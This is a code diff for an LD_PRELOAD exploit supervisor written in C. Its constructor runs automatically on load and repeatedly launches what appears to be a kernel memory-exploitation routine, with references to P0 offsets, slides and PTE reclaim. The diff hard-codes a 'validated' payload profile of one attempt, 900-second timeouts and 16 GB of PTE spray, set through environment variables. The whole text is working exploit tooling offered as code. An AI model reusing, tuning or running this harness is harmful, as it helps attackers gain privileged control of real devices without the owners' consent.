@@ -1,13 +1,15 @@
 #include "common.h"
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define DEFAULT_EXPLOIT_ATTEMPTS 24
+#define DEFAULT_EXPLOIT_ATTEMPTS 1
+#define DEFAULT_ATTEMPT_TIMEOUT_SEC 900
+#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 900
 #else
 #define DEFAULT_EXPLOIT_ATTEMPTS 16
-#endif
-#define DEFAULT_PSELECT_DELAY_USEC 20000
 #define DEFAULT_ATTEMPT_TIMEOUT_SEC 90
 #define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 20
+#endif
+#define DEFAULT_PSELECT_DELAY_USEC 20000
 #define APP_MIN_BOOT_UPTIME_SEC 120
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
@@ -81,6 +83,17 @@ static int attempt_delay_usec(int base_delay, int attempt) {
   return delay < 0 ? 0 : delay;
 }
 
+static void apply_validated_app_profile(void) {
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+  SYSCHK(setenv("CONTROLLED_RECLAIM", "1", 1));
+  SYSCHK(setenv("READINESS_PAUSE", "1", 1));
+  SYSCHK(setenv("READINESS_PTE_MB", "16384", 1));
+  SYSCHK(setenv("EXPLOIT_ATTEMPTS", "1", 1));
+  SYSCHK(setenv("EXPLOIT_ATTEMPT_TIMEOUT_SEC", "900", 1));
+  SYSCHK(setenv("P0_ATTEMPT_TIMEOUT_SEC", "900", 1));
+#endif
+}
+
 static void wait_for_boot_quiet_window(void) {
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
   struct timespec uptime;
@@ -103,17 +116,18 @@ __attribute__((constructor)) static void load(void) {
   }
   started = 1;
   set_unbuffer();
+  apply_validated_app_profile();
   wait_for_boot_quiet_window();
 
   int max_attempts = env_int(
       "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
-  int base_delay = env_int(
-      "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
   int attempt_timeout_sec = env_int(
       "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 5, 900);
   int p0_attempt_timeout_sec = env_int(
       "P0_ATTEMPT_TIMEOUT_SEC", DEFAULT_P0_ATTEMPT_TIMEOUT_SEC, 5,
       attempt_timeout_sec);
+  int base_delay = env_int(
+      "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
   if (p0_attempt_timeout_sec > attempt_timeout_sec) {
     p0_attempt_timeout_sec = attempt_timeout_sec;
   }
@@ -133,6 +147,10 @@ __attribute__((constructor)) static void load(void) {
   unsetenv("LD_PRELOAD");
   char *argv[] = {"preload.so", NULL};
 
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+  pr_success("validated route controlled_reclaim=on readiness_pause=on "
+             "pte_mb=16384\n");
+#endif
   pr_success("preload supervisor pid=%d attempts=%d base_delay=%d "
              "p0_timeout=%d timeout=%d\n",
              getpid(), max_attempts, base_delay, p0_attempt_timeout_sec,
